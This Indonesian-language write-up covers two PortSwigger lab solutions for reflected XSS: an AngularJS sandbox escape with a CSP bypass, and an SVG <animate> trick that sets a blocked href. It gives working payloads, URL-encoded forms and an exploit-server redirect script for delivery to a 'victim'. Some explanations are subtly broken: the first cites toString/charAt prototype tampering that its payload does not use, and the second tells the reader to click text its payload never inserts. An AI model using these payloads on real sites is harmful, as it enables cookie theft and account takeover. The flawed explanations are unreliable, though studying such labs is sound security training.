### **Proof of Concept (PoC) Reflected XSS dengan Escape Sandbox AngularJS dan Bypass Content Security Policy (CSP)**

#### **Deskripsi Singkat**
Reflected Cross-Site Scripting (XSS) adalah kerentanan keamanan web di mana input pengguna yang tidak divalidasi dengan baik direfleksikan kembali oleh aplikasi web dalam responsnya. Pada lab ini, AngularJS digunakan bersama dengan Content Security Policy (CSP) yang ketat untuk mencegah eksekusi skrip berbahaya. Tantangan ini adalah melakukan serangan XSS yang dapat melewati CSP, meng-escape sandbox AngularJS, dan mengeksekusi fungsi `alert(document.cookie)`.

#### **Langkah-langkah PoC**

1. **Memahami Konteks dan Pembatasan**
   
   - **Konteks:** Input pengguna direfleksikan dalam fungsi pencarian blog yang menggunakan AngularJS.
   - **Pembatasan:**
     - Fungsi `$eval` tidak tersedia.
     - Penggunaan string dalam AngularJS dibatasi.
     - Karakter khusus seperti kurung sudut (`<`, `>`), tanda petik ganda (`"`), dan backticks (`` ` ``) di-HTML-encode.
     - Tanda petik tunggal (`'`) dan backslash (`\`) di-escape.
     - Content Security Policy (CSP) diterapkan untuk mencegah eksekusi skrip dari sumber yang tidak terpercaya.

   ![Langkah 1: Konteks AngularJS dan CSP](images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/1.png)

2. **Menyusun Payload yang Bypass CSP dan AngularJS Sandbox**
   
   - **Payload:**
     
     ```html
     <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
     ```
   
   - **Penjelasan Payload:**
     - `<input id=x`: Membuat elemen input dengan ID `x`.
     - `ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'`: 
       - `ng-focus`: Direktif AngularJS yang dipicu saat elemen menerima fokus.
       - `$event.composedPath()`: Mengakses jalur event dalam DOM.
       - `|orderBy:'(z=alert)(document.cookie)'`: Menggunakan filter `orderBy` untuk menjalankan fungsi `alert` dengan `document.cookie` sebagai argumen.
   
   - **Encoded Payload:**
     
     Karena karakter tertentu di-encode, payload di atas harus di-URL-encode untuk dimasukkan ke dalam parameter `search`. Hasilnya adalah:
     
     ```
     %3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E
     ```

3. **Mengirimkan Payload melalui Server Eksploitasi**
   
   - **Langkah-langkah:**
     1. **Kunjungi Server Eksploitasi:**
        - Buka server eksploitasi yang telah disediakan.
     
     2. **Paste Kode Eksploitasi:**
        - Masukkan kode berikut ke dalam server eksploitasi, mengganti `YOUR-LAB-ID` dengan ID lab Anda:
        
          ```html
          <script>
          location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
          </script>
          ```
     
     3. **Kirimkan Eksploitasi ke Korban:**
        - Klik tombol "Store" dan kemudian "Deliver exploit to victim" untuk mengirimkan skrip ke target.
   
   - **Gambar Ilustrasi:**
     
     ![Langkah 3: Mengirimkan Eksploitasi](images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/2.png)

4. **Memverifikasi Eksekusi Payload**
   
   - **Langkah-langkah:**
     1. **Salin URL Eksploitasi:**
        - Setelah mengirimkan eksploitasi, salin URL yang dihasilkan.
     
     2. **Buka Browser dan Paste URL:**
        - Buka browser (disarankan **Chrome** sesuai instruksi lab) dan tempelkan URL yang telah disalin.
     
     3. **Klik Elemen yang Terpengaruh:**
        - Setelah halaman dimuat, klik pada elemen yang terpengaruh (misalnya, nama pengguna atau area terkait). Jika payload berhasil dieksekusi, popup alert yang menampilkan `document.cookie` akan muncul.
   
   - **Gambar Ilustrasi:**
     
     ![Langkah 4: Eksekusi Payload](images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/3.png)

5. **Penjelasan Mengapa Payload Ini Berfungsi**
   
   - **Bypass CSP:**
     - Payload mengalihkan lokasi (`location`) ke URL yang mengandung payload XSS, yang dianggap sah oleh CSP jika sumbernya diizinkan.
   
   - **Escape AngularJS Sandbox:**
     - Dengan memanipulasi fungsi `toString()` dan mengganti prototype `charAt`, payload mengubah cara AngularJS memproses input, memungkinkan eksekusi kode JavaScript yang disisipkan.
   
   - **Eksekusi `alert(document.cookie)`:**
     - Filter `orderBy` memproses argumen yang diberikan dan menjalankan fungsi `alert` dengan `document.cookie` sebagai argumen, menampilkan informasi cookie pengguna.

6. **Catatan Penting**
   
   - **Keamanan:** Reflected XSS dapat digunakan untuk mencuri informasi sensitif seperti cookie sesi, melakukan pengambilalihan akun, atau mengubah tampilan dan fungsi halaman web.
   
   - **Etika:** Melakukan eksploitasi XSS tanpa izin adalah ilegal dan melanggar etika. PoC ini disediakan hanya untuk tujuan edukasi dan membantu dalam memahami serta mencegah kerentanan keamanan.
   
   - **Browser Spesifik:** Pastikan untuk menguji payload pada browser yang ditentukan (Chrome) karena perilaku penanganan XSS dan CSP dapat berbeda antar browser.

#### **Referensi:**

- [Cross-Site Scripting (XSS) di Konteks yang Berbeda](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [Penelitian XSS pada Hidden Input Fields](https://portswigger.net/research/xss-in-hidden-input-fields)

---

![Gambar Ilustrasi Langkah 1](images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/4.png)
![Gambar Ilustrasi Langkah 2](images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/5.png)
![Gambar Ilustrasi Langkah 3](images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/6.png)

---

### **Proof of Concept (PoC) Reflected XSS dengan Event Handlers dan Atribut href Diblokir**

#### **Deskripsi Singkat**
Reflected Cross-Site Scripting (XSS) adalah kerentanan keamanan web di mana input pengguna yang tidak divalidasi dengan baik direfleksikan kembali oleh aplikasi web dalam responsnya. Pada lab ini, beberapa tag diizinkan (whitelisted), namun semua event handlers (seperti `onclick`) dan atribut `href` pada tag `<a>` diblokir. Tantangan ini adalah menyuntikkan vektor yang, ketika diklik, memanggil fungsi `alert` tanpa menggunakan event handlers atau atribut `href`.

#### **Langkah-langkah PoC**

1. **Memahami Pembatasan yang Diberikan**
   
   - **Tag yang Diizinkan:** Beberapa tag seperti `<a>`, `<svg>`, dan lain-lain diizinkan.
   - **Event Handlers dan atribut `href` diblokir:** Tidak dapat menggunakan atribut seperti `onclick`, `onmouseover`, atau `href="javascript:alert(1)"`.
   - **Tujuan:** Menyisipkan elemen yang dapat diklik oleh pengguna dan memanggil fungsi `alert` tanpa menggunakan event handlers atau atribut `href`.

2. **Menyusun Payload yang Efektif**
   
   - **Metode:** Menggunakan tag `<svg>` dengan elemen `<a>` dan `<animate>` untuk memicu eksekusi JavaScript tanpa menggunakan event handlers atau atribut `href`.
   
   - **Payload:**
     
     ```html
     <svg><a><animate attributeName="href" from="javascript:alert(1)" to="javascript:alert(1)" /></a></svg>
     ```
   
   - **Penjelasan Payload:**
     - `<svg>`: Tag SVG yang diizinkan.
     - `<a>`: Tag anchor yang diizinkan, namun atribut `href` diblokir.
     - `<animate>`: Elemen SVG yang digunakan untuk menganimasi atribut. Di sini, digunakan untuk menyetel atribut `href` ke `javascript:alert(1)` tanpa langsung menulis `href`.

3. **Meng-URL Encode Payload**
   
   Agar payload dapat disisipkan ke dalam parameter URL, perlu di-URL encode terlebih dahulu.
   
   - **Encoded Payload:**
     
     ```
     %3Csvg%3E%3Ca%3E%3Canimate%20attributeName%3D%22href%22%20from%3D%22javascript%3Aalert(1)%22%20to%3D%22javascript%3Aalert(1)%22%20/%3E%3C/a%3E%3C/svg%3E
     ```

4. **Mengirimkan Payload melalui URL Lab**
   
   - **Contoh URL Eksploitasi:**
     
     ```
     https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate%20attributeName%3D%22href%22%20from%3D%22javascript%3Aalert(1)%22%20to%3D%22javascript%3Aalert(1)%22%20/%3E%3C/a%3E%3C/svg%3E#x
     ```
   
   - **Langkah-langkah:**
     1. **Ganti `YOUR-LAB-ID`:** Ganti bagian `YOUR-LAB-ID` dengan ID lab Anda.
     2. **Akses URL:** Buka URL tersebut di browser (disarankan **Chrome** sesuai instruksi lab).
   
   - **Penjelasan:**
     - Payload disisipkan ke dalam parameter `search`.
     - Ketika halaman dimuat, elemen SVG dengan elemen `<a>` dan `<animate>` akan disisipkan ke dalam DOM.
     - Pengguna melihat teks "Click" (sesuai instruksi lab) yang terhubung dengan elemen `<a>`.
     - Ketika pengguna mengklik teks tersebut, atribut `href` telah diatur ke `javascript:alert(1)` oleh elemen `<animate>`, sehingga fungsi `alert` dipanggil.

5. **Memverifikasi Eksekusi Payload**
   
   - **Langkah-langkah:**
     1. **Salin URL Eksploitasi:**
        - Pastikan URL yang telah disusun dengan payload benar.
     
     2. **Buka Browser (Chrome):**
        - Buka browser Chrome dan tempelkan URL yang telah disalin.
     
     3. **Klik "Click me":**
        - Setelah halaman dimuat, klik pada teks "Click" yang disisipkan.
        - Sebuah popup alert dengan pesan `1` akan muncul, menandakan bahwa serangan XSS berhasil dieksekusi.
   
   - **Gambar Ilustrasi:**
     
     ![Langkah 5: Eksekusi Payload](images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/1.png)

#### **Mengapa Payload Ini Berfungsi?**
   
Meskipun event handlers seperti `onclick` dan atribut `href` diblokir secara langsung, payload ini memanfaatkan kemampuan SVG untuk menganimasi atribut yang secara tidak langsung dapat memicu eksekusi JavaScript. Dengan menggunakan elemen `<animate>`, atribut `href` pada tag `<a>` diatur ke `javascript:alert(1)` tanpa harus menulisnya secara eksplisit, sehingga melewati filter yang memblokir atribut tersebut.

#### **Catatan Penting**

- **Keamanan:** Reflected XSS dapat digunakan untuk mencuri informasi sensitif seperti cookie sesi, melakukan pengambilalihan akun, atau mengubah tampilan dan fungsi halaman web.
  
- **Etika:** Melakukan eksploitasi XSS tanpa izin adalah ilegal dan melanggar etika. PoC ini disediakan hanya untuk tujuan edukasi dan membantu dalam memahami serta mencegah kerentanan keamanan.
  
- **Browser Spesifik:** Pastikan untuk menguji payload pada browser yang ditentukan (Chrome) karena perilaku penanganan XSS dan SVG dapat berbeda antar browser.

#### **Referensi:**

- [Cross-Site Scripting (XSS) di Konteks yang Berbeda](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [Penelitian XSS pada Hidden Input Fields](https://portswigger.net/research/xss-in-hidden-input-fields)

---

![Gambar Ilustrasi Langkah 1](images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/2.png)
![Gambar Ilustrasi Langkah 2](images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/3.png)
![Gambar Ilustrasi Langkah 3](images/Reflected%20XSS%20with%20event%20handlers%20and%20href%20attributes%20blocked/4.png)
